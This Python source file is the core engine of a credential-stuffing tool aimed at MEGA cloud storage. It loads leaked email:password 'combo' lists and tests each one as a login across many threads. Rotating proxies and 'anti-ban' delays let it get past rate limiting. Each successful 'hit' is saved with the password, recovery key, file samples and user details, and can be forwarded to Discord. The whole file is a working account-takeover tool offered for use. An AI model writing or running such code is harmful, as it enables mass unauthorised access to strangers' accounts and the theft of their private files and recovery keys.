"""
MEGA Checker Engine
Handles multi-threaded account checking with proper progress tracking
"""

import threading
from queue import Queue
from datetime import datetime
from typing import Callable, Optional
import logging
import time
from tenacity import retry, stop_after_attempt, wait_exponential

from mega_auth import MegaAuthenticator
from proxy_rotator import anti_ban

# Discord notifier removed - not needed for core functionality

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


def format_bytes(size_in_bytes: float) -> str:
    """
    Format bytes to human-readable format (B, KB, MB, GB, TB)
    
    Args:
        size_in_bytes: Size in bytes
        
    Returns:
        Formatted string with appropriate unit
    """
    power = 1024
    n = 0
    units = ['B', 'KB', 'MB', 'GB', 'TB']
    
    size = float(size_in_bytes)
    while size > power and n < len(units) - 1:
        size /= power
        n += 1
    
    return f"{size:.2f} {units[n]}"


logger = logging.getLogger(__name__)


class CheckerEngine:
    """Multi-threaded MEGA account checker"""
    
    def __init__(self, thread_count: int = 10):
        self.thread_count = thread_count
        self.queue = Queue()
        self.authenticator = MegaAuthenticator()
        
        # Enhanced Statistics
        self.checked = 0
        self.hits = 0
        self.blocked = 0
        self.customs = 0  # Blocked/custom accounts separate from fails
        self.fails = 0
        self.errors = 0
        self.total = 0
        self.start_time = None
        self.accounts_per_minute = 0
        
        # Detailed Hit Categories
        self.pro_hits = 0
        self.pro_hits_low_files = 0  # Pro accounts with < 5 files
        self.pro_hits_high_files = 0  # Pro accounts with >= 5 files
        self.free_hits = 0
        self.free_hits_low_files = 0  # Free accounts with < 5 files
        self.free_hits_high_files = 0  # Free accounts with >= 5 files
        self.empty_hits = 0
        
        # Locks for thread-safe operations
        self.stats_lock = threading.Lock()
        self.file_lock = threading.Lock()
        
        # Configuration
        self.keyword = ""
        self.filename = "hits.txt"
        self.discord_notifier = None
        self.deep_check_enabled = False
        self.start_position = 0
        
        # Output file paths
        self.pro_hits_file = "hits_pro.txt"
        self.free_hits_file = "hits_free.txt"
        self.empty_hits_file = "hits_empty.txt"
        
        # Callbacks for UI updates
        self.progress_callback: Optional[Callable] = None
        self.status_callback: Optional[Callable] = None
        
        # Control flags
        self.running = False
        self.stop_requested = False
    
    def set_configuration(self, keyword: str, filename: str, discord_notifier: Optional[object] = None,
                         deep_check: bool = False, start_position: int = 0):
        """Set checker configuration"""
        self.keyword = keyword
        self.filename = filename
        self.discord_notifier = discord_notifier  # Optional, can be None
        self.deep_check_enabled = deep_check
        self.start_position = start_position
        
        # Set output files based on main filename
        base_name = filename.replace('.txt', '')
        self.pro_hits_file = f"{base_name}_pro.txt"
        self.free_hits_file = f"{base_name}_free.txt"
        self.empty_hits_file = f"{base_name}_empty.txt"
    
    def set_callbacks(self, progress_callback: Callable, status_callback: Callable):
        """Set UI update callbacks"""
        self.progress_callback = progress_callback
        self.status_callback = status_callback
    
    def load_combo_file(self, filepath: str, remove_duplicates: bool = False) -> list:
        """
        Load combo file and parse credentials
        
        Args:
            filepath: Path to combo file
            remove_duplicates: Whether to remove duplicate entries
            
        Returns:
            List of (email, password) tuples
        """
        combos = []
        seen = set()
        
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if ':' in line and not line.startswith('#'):
                        parts = line.split(':', 1)
                        if len(parts) == 2:
                            email = parts[0].strip()
                            password = parts[1].strip()
                            if email and password:
                                combo = (email, password)
                                
                                if remove_duplicates:
                                    combo_key = f"{email}:{password}"
                                    if combo_key not in seen:
                                        seen.add(combo_key)
                                        combos.append(combo)
                                else:
                                    combos.append(combo)
        except Exception as e:
            logger.error(f"Error loading combo file: {e}")
        
        return combos
    
    def save_hit(self, email: str, password: str, used_space: float, total_space: float,
                 keyword_found: bool, position: int, account_type: str = "Free",
                 deep_check_data: dict = None, account_data: dict = None):
        """Save enhanced hit with recovery key and detailed account information"""
        with self.file_lock:
            try:
                # Determine which file to save to
                if account_type == "Empty":
                    output_file = self.empty_hits_file
                elif "Pro" in account_type:
                    output_file = self.pro_hits_file
                else:
                    output_file = self.free_hits_file
                
                with open(output_file, 'a', encoding='utf-8') as f:
                    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    
                    # Enhanced hit format with recovery key and detailed info
                    line = (
                        f"🎯 HYPERION ELITE HIT FOUND\n"
                        f"{'=' * 60}\n"
                        f"📧 Email: {email}\n"
                        f"🔑 Password: {password}\n"
                        f"🛡️ Recovery Key: {account_data.get('recovery_key', 'N/A') if account_data else 'N/A'}\n"
                        f"\n📊 ACCOUNT DETAILS:\n"
                        f"├── Plan: MEGA {account_type}\n"
                        f"├── Total Storage: {total_space} GB\n"
                        f"├── Used Storage: {used_space} GB\n"
                        f"├── Free Space: {total_space - used_space:.2f} GB\n"
                        f"├── Usage: {(used_space/total_space*100) if total_space > 0 else 0:.1f}%\n"
                        f"\n📁 FILES & FOLDERS:\n"
                        f"├── Total Files: {account_data.get('file_count', 0) if account_data else 0}\n"
                        f"├── Total Folders: {account_data.get('folder_count', 0) if account_data else 0}\n"
                    )
                    
                    # Add deep check data if available
                    if deep_check_data and deep_check_data.get('success'):
                        line += (
                            f"├── Detailed Files: {deep_check_data.get('total_files', 0)}\n"
                            f"├── Detailed Folders: {deep_check_data.get('total_folders', 0)}\n"
                        )
                        
                        # Add file list preview (first 5 files)
                        file_list = deep_check_data.get('file_list', [])
                        if file_list:
                            line += f"\n📄 SAMPLE FILES (First 5):\n"
                            for i, file_info in enumerate(file_list[:5]):
                                if isinstance(file_info, dict):
                                    file_name = file_info.get('name', 'Unknown')
                                    file_size = format_bytes(file_info.get('size', 0))
                                    line += f"├── {file_name} ({file_size})\n"
                    
                    # User information
                    if account_data and account_data.get('user_info'):
                        user_info = account_data['user_info']
                        line += (
                            f"\n👤 USER INFO:\n"
                            f"├── Handle: {user_info.get('user_handle', 'N/A')}\n"
                            f"├── Country: {user_info.get('country', 'N/A')}\n"
                            f"├── Created: {user_info.get('created', 'N/A')}\n"
                        )
                    
                    # Search results
                    line += (
                        f"\n🔍 SEARCH RESULTS:\n"
                        f"├── Keyword: {self.keyword if self.keyword else 'N/A'}\n"
                        f"├── Match Found: {'✅ YES' if keyword_found else '❌ NO'}\n"
                        f"\n⏰ CHECK INFO:\n"
                        f"├── Position: {position}/{self.total}\n"
                        f"├── Timestamp: {timestamp}\n"
                        f"├── Checker: HYPERION Elite Bot v5.0\n"
                        f"└── Powered by: @megacheckk_bot\n"
                        f"\n{'=' * 60}\n\n"
                    )
                    f.write(line)
                    
                # Also save to main hits file
                with open(self.filename, 'a', encoding='utf-8') as f:
                    f.write(line)
                    
                # Create simplified format for easy parsing
                simple_format = f"{email}:{password}|{account_data.get('recovery_key', 'N/A') if account_data else 'N/A'}|{account_data.get('file_count', 0) if account_data else 0}|{account_data.get('folder_count', 0) if account_data else 0}|{account_type}\n"
                with open(self.filename.replace('.txt', '_simple.txt'), 'a', encoding='utf-8') as f:
                    f.write(simple_format)
                    
            except Exception as e:
                logger.error(f"Error saving enhanced hit: {e}")
    
    def update_stats(self, stat_type: str, account_type: str = None, file_count: int = 0):
        """Enhanced thread-safe statistics update with detailed categorization"""
        with self.stats_lock:
            self.checked += 1
            
            if stat_type == "hit":
                self.hits += 1
                
                # Categorize hits by account type and file count
                if account_type:
                    if "Pro" in account_type:
                        self.pro_hits += 1
                        if file_count < 5:
                            self.pro_hits_low_files += 1
                        else:
                            self.pro_hits_high_files += 1
                    elif account_type == "Empty":
                        self.empty_hits += 1
                    else:  # Free accounts
                        self.free_hits += 1
                        if file_count < 5:
                            self.free_hits_low_files += 1
                        else:
                            self.free_hits_high_files += 1
                            
            elif stat_type == "blocked" or stat_type == "custom":
                self.customs += 1  # Combine blocked and custom
            elif stat_type == "fail":
                self.fails += 1
            elif stat_type == "error":
                self.errors += 1
            
            # Calculate accounts per minute
            if self.start_time:
                elapsed_minutes = (time.time() - self.start_time) / 60
                if elapsed_minutes > 0:
                    self.accounts_per_minute = self.checked / elapsed_minutes
            
            # Enhanced progress callback with detailed metrics
            if self.progress_callback:
                self.progress_callback(self.checked, self.total, self.hits, 
                                      self.customs, self.fails, self.errors,
                                      self.pro_hits, self.free_hits, self.empty_hits,
                                      self.pro_hits_low_files, self.pro_hits_high_files,
                                      self.free_hits_low_files, self.free_hits_high_files)
    
    @retry(
        stop=stop_after_attempt(3),
        wait=wait_exponential(multiplier=1, min=2, max=10),
        reraise=True
    )
    def check_account(self, email: str, password: str, position: int):
        """Check a single account with automatic retry on transient errors + anti-ban protection"""
        if self.stop_requested:
            return
        
        # 🛡️ Anti-Ban: Wait if needed before making request
        delay = anti_ban.wait_if_needed()
        if delay > 0 and self.status_callback:
            self.status_callback(f"🛡️ Anti-Ban delay: {delay:.1f}s (protecting IP)", "info")
        
        # Get current proxy if available
        current_proxy = anti_ban.get_current_proxy()
        
        try:
            # Attempt login (with proxy if available)
            success, account_data, error = self.authenticator.login(
                email, password, 
                proxy=current_proxy
            )
            
            if success:
                # Mark proxy as successful
                if current_proxy:
                    anti_ban.mark_proxy_success(current_proxy)
                
                # Get basic info
                used_space = account_data['used_space']
                total_space = account_data['total_space']
                file_count = account_data['file_count']
                
                # Determine account type
                account_type = self.authenticator.get_account_type(
                    used_space, total_space, file_count
                )
                
                # Check for keyword
                keyword_found = False
                if self.keyword:
                    keyword_found = self.authenticator.search_files(
                        account_data['files'], self.keyword
                    )
                
                # Deep check if enabled
                deep_check_data = None
                if self.deep_check_enabled:
                    deep_check_data = self.authenticator.deep_check(
                        account_data['mega_instance']
                    )
                
                # Save enhanced hit with recovery key and detailed info
                self.save_hit(
                    email, password,
                    used_space,
                    total_space,
                    keyword_found,
                    position,
                    account_type,
                    deep_check_data,
                    account_data  # Pass full account data including recovery key
                )
                
                # Send Discord notification
                if self.discord_notifier and self.discord_notifier.enabled:
                    self.discord_notifier.send_hit_notification(
                        email, password,
                        used_space,
                        total_space,
                        keyword_found,
                        self.keyword,
                        position,
                        self.total
                    )
                
                # Update status with enhanced information
                if self.status_callback:
                    status_msg = (
                        f"🎯 ELITE HIT ({account_type}): {email}\n"
                        f"🔑 Recovery Key: {account_data.get('recovery_key', 'N/A')}\n"
                        f"📊 Storage: {used_space}GB / {total_space}GB\n"
                        f"📁 Files: {account_data.get('file_count', 0)} | Folders: {account_data.get('folder_count', 0)}"
                    )
                    if deep_check_data and deep_check_data.get('success'):
                        status_msg += f"\n🔍 Deep Scan: Files: {deep_check_data['total_files']} | Folders: {deep_check_data['total_folders']}"
                    if keyword_found:
                        status_msg += f"\n🎯 Keyword '{self.keyword}' found!"
                    self.status_callback(status_msg, "hit")
                
                # Enhanced stats update with account type and file count
                self.update_stats("hit", account_type, account_data.get('file_count', 0))
                
            else:
                # Handle different error types
                if error == "BLOCKED" or "blocked" in str(error).lower():
                    if self.status_callback:
                        self.status_callback(f"🚫 CUSTOM (Blocked): {email}", "warning")
                    self.update_stats("custom")
                else:
                    if self.status_callback:
                        self.status_callback(f"❌ FAIL: {email}", "error")
                    self.update_stats("fail")
        
        except Exception as e:
            logger.error(f"Error checking {email}: {e}")
            if self.status_callback:
                self.status_callback(f"⚠️ ERROR: {email} - {str(e)}", "error")
            self.update_stats("error")
    
    def worker(self):
        """Worker thread function"""
        while not self.stop_requested:
            try:
                item = self.queue.get(timeout=1)
                if item is None:
                    break
                
                email, password, position = item
                self.check_account(email, password, position)
                self.queue.task_done()
            except:
                continue
    
    def start_checking(self, combos: list):
        """Start the checking process"""
        self.running = True
        self.stop_requested = False
        self.start_time = time.time()  # Track start time for stats
        
        # Apply start position if set
        if self.start_position > 0 and self.start_position < len(combos):
            combos = combos[self.start_position:]
            if self.status_callback:
                self.status_callback(
                    f"📍 Starting from position {self.start_position + 1}",
                    "info"
                )
        
        self.total = len(combos)
        
        # Reset statistics
        self.checked = 0
        self.hits = 0
        self.blocked = 0
        self.customs = 0
        self.fails = 0
        self.accounts_per_minute = 0
        
        # Send start notification
        if self.discord_notifier and self.discord_notifier.enabled:
            self.discord_notifier.send_start_notification(
                self.total, self.filename, self.keyword, self.thread_count
            )
        
        # Create output files
        output_files = [
            self.filename,
            self.pro_hits_file,
            self.free_hits_file,
            self.empty_hits_file
        ]
        
        for output_file in output_files:
            try:
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(f"MEGA Checker Results - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"Deep Check: {'Enabled' if self.deep_check_enabled else 'Disabled'}\n")
                    f.write("=" * 100 + "\n\n")
            except Exception as e:
                logger.error(f"Error creating output file {output_file}: {e}")
        
        # Add combos to queue
        for idx, (email, password) in enumerate(combos, self.start_position + 1):
            self.queue.put((email, password, idx))
        
        # Start worker threads
        threads = []
        for _ in range(self.thread_count):
            t = threading.Thread(target=self.worker, daemon=True)
            t.start()
            threads.append(t)
        
        # Wait for completion
        self.queue.join()
        
        # Stop workers
        for _ in range(self.thread_count):
            self.queue.put(None)
        
        for t in threads:
            t.join(timeout=5)
        
        self.running = False
        
        # Calculate final statistics
        elapsed_time = time.time() - self.start_time if self.start_time else 0
        elapsed_minutes = elapsed_time / 60
        
        # Send enhanced completion notification
        if self.discord_notifier and self.discord_notifier.enabled:
            success_rate = (self.hits / self.checked * 100) if self.checked > 0 else 0
            completion_msg = (
                f"**📊 MEGA Checker Session Complete**\n\n"
                f"**Total Checked:** {self.checked}/{self.total}\n"
                f"**✅ Hits:** {self.hits}\n"
                f"**🚫 Customs (Blocked):** {self.customs}\n"
                f"**❌ Fails:** {self.fails}\n\n"
                f"**Success Rate:** {success_rate:.2f}%\n"
                f"**Speed:** {self.accounts_per_minute:.1f} accounts/min\n"
                f"**Time Elapsed:** {int(elapsed_minutes)} minutes\n\n"
                f"**Export File:** {self.filename}\n"
                f"**Keyword:** {self.keyword if self.keyword else 'N/A'}\n"
                f"**Deep Check:** {'Enabled' if self.deep_check_enabled else 'Disabled'}\n\n"
                f"🎯 **MEGA Checker Professional Edition**"
            )
            self.discord_notifier.send_custom_message(completion_msg)
        
        if self.status_callback:
            self.status_callback(
                f"🏁 Checking completed! Hits: {self.hits} | Customs: {self.customs} | "
                f"Fails: {self.fails} | Speed: {self.accounts_per_minute:.1f}/min",
                "info"
            )
    
    def stop_checking(self):
        """Stop the checking process"""
        self.stop_requested = True
        self.running = False
    
    def check_single_account(self, email: str, password: str) -> dict:
        """
        Check a single account and return results
        
        Args:
            email: Account email
            password: Account password
            
        Returns:
            Dictionary with check results
        """
        try:
            success, account_data, error = self.authenticator.login(email, password)
            
            if success:
                used_space = account_data['used_space']
                total_space = account_data['total_space']
                file_count = account_data['file_count']
                
                account_type = self.authenticator.get_account_type(
                    used_space, total_space, file_count
                )
                
                deep_check_data = None
                if self.deep_check_enabled:
                    deep_check_data = self.authenticator.deep_check(
                        account_data['mega_instance']
                    )
                
                return {
                    'success': True,
                    'email': email,
                    'password': password,
                    'used_space': used_space,
                    'total_space': total_space,
                    'file_count': file_count,
                    'account_type': account_type,
                    'deep_check': deep_check_data
                }
            else:
                return {
                    'success': False,
                    'email': email,
                    'password': password,
                    'error': error
                }
        except Exception as e:
            return {
                'success': False,
                'email': email,
                'password': password,
                'error': str(e)
            }
    
    def save_combos_without_duplicates(self, input_file: str, output_file: str) -> int:
        """
        Remove duplicates from combo file and save
        
        Args:
            input_file: Input combo file path
            output_file: Output combo file path
            
        Returns:
            Number of duplicates removed
        """
        try:
            combos = self.load_combo_file(input_file, remove_duplicates=False)
            original_count = len(combos)
            
            # Remove duplicates
            seen = set()
            unique_combos = []
            for email, password in combos:
                combo_key = f"{email}:{password}"
                if combo_key not in seen:
                    seen.add(combo_key)
                    unique_combos.append((email, password))
            
            # Save unique combos
            with open(output_file, 'w', encoding='utf-8') as f:
                for email, password in unique_combos:
                    f.write(f"{email}:{password}\n")
            
            duplicates_removed = original_count - len(unique_combos)
            return duplicates_removed
        except Exception as e:
            logger.error(f"Error removing duplicates: {e}")
            return 0
